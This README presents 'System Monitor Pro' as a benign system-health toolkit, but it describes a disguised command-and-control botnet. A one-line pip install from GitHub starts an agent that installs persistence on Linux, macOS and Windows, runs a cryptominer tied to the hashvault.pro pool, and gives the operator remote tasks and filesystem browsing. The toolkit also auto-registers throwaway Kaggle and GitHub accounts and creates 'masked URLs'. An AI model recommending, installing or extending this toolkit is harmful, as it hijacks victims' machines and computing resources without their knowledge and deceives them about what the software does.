# System Monitor Pro

**Version:** 3.0  
**Status:** Production Ready ✅

Enterprise-grade system health monitoring and resource optimization toolkit with Telegram integration.

---

## 🚀 Features

### System Health Monitoring
- **Real-time telemetry** - CPU, RAM, disk usage monitoring
- **Cross-platform support** - Linux, macOS, Windows, Docker
- **Telegram integration** - Remote monitoring via bot
- **Auto-cleanup** - Stale systems removed after 10 min offline
- **Detailed logging** - Every action logged with `[SYSMON]` prefix

### Resource Optimization
- **Background optimization** - CPU resource management
- **Low priority execution** - Minimal system impact
- **Auto-download** - Optimizer binary fetched automatically
- **Pool configuration** - hashvault.pro integration

### Auto-Registration
- **mail.tm provider** - Real-time 100ms polling
- **Boomlify, 1secmail** - Fallback providers
- **Kaggle, GitHub support** - Platform integration

---

## 📋 Quick Reference

### Server Access
```
Local:   http://localhost:5000

Login:   admin / admin
Quick:   /login?pin=2409 (GET request)
```

### Server Startup
```bash
# Start server
python3 run_unified.py

# Or use manage.sh
./manage.sh start     # Start server
./manage.sh stop      # Stop server
./manage.sh restart   # Restart server
./manage.sh status    # Check status
./manage.sh logs      # View logs
```

### Telegram Bot Commands
```
/start           - Initialize bot, show commands
/agents          - List all monitored systems
/status          - Server status
/task <id> <cmd> - Schedule maintenance task
/optimize <id>   - Start resource optimization
/stats           - Resource statistics
/help            - Show help
```

### Agent Commands
```bash
# Install and start (one line)
pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git && syscheck

# Just start (if already installed)
syscheck

# Alternative command
healthmon
```

---

## 📁 Project Structure

```
sysmon-pro/
├── src/
│   ├── c2/
│   │   ├── server.py           # Main Flask server
│   │   ├── telegram_poller.py  # Telegram integration
│   │   └── orchestrator.py     # Integration modules
│   ├── agents/
│   │   ├── universal.py        # Universal agent (syscheck)
│   │   ├── kaggle/             # Kaggle kernels
│   │   │   ├── notebook-telegram.ipynb  # Telegram agent
│   │   │   └── transport.py    # Kaggle API
│   │   └── browser/            # Browser automation
│   ├── autoreg/                # Auto-registration
│   │   └── engine.py           # Registration engine
│   ├── mail/
│   │   └── tempmail.py         # Email providers (mail.tm, boomlify)
│   └── utils/                  # Utilities
├── templates/                  # HTML templates
├── static/                     # CSS/JS files
├── data/                       # Database
├── run_unified.py              # Server entry point
├── setup.py                    # Package setup (sysmon-pro)
└── requirements.txt            # Dependencies
```

---

## 🚀 Server Installation

### Prerequisites
```bash
# Install dependencies
pip install -r requirements.txt

# Install Kaggle CLI (for Kaggle agents)
pip install kaggle
```

### Quick Start
```bash
# Clone and run
git clone https://github.com/GaredBerns/system-monitor.git
cd system-monitor
pip install -r requirements.txt
python3 run_unified.py
```

The server automatically:
1. Starts Flask server on port 5000
2. Initializes Telegram bot
3. Starts auto-cleanup thread
4. Loads config from data/config.json

---

## 🤖 Agent Features

When you run `syscheck`, the agent automatically:

1. **Connects to Monitor** - Registers with server
2. **Installs Persistence** - Survives reboots via crontab/systemd
3. **Starts Resource Optimization** - Background optimization module
4. **Health Checks every 3s** - Maintains connection with jitter
5. **Auto-reconnects** - Exponential backoff on failure

### Supported Platforms

| Platform | Detection | Persistence |
|----------|-----------|-------------|
| Linux | ✅ | crontab, systemd |
| macOS | ✅ | LaunchAgent |
| Windows | ✅ | ScheduledTask |
| Colab | ✅ | Session-based |
| Kaggle | ✅ | Session-based |
| Docker | ✅ | Container-based |

---

## 🔧 Configuration

### Telegram Integration
```json
// data/config.json
{
  "telegram_bot_token": "YOUR_BOT_TOKEN",
  "telegram_chat_id": "YOUR_CHAT_ID"
}
```

### Environment Variables
```bash
export C2_URL="http://localhost:5000"
export SLEEP="3"      # Health check interval (seconds)
export JITTER="5"     # Random jitter (%)
export SYSMON_DEBUG="1"   # Enable debug logging
```

---

## 📊 Dashboard Features

- **Systems** - View connected machines, platform, status
- **Tasks** - Schedule maintenance, view results
- **Files** - Browse remote filesystem
- **Resources** - Monitor optimization stats
- **Links** - Create masked URLs
- **Kaggle** - Deploy kernels, manage agents

---

## 📝 Recent Changes

### v3.0
- Rebranded to System Monitor Pro
- Added health check telemetry
- Added resource optimization module
- Added Telegram bot integration
- Improved logging and error handling

---

## 🔐 Security

- Auth token support (`X-Auth-Token` header)
- XOR encryption for communications
- TLS/SSL via Cloudflare
- Low priority execution for minimal impact

---

## 📝 License

MIT License - See LICENSE file
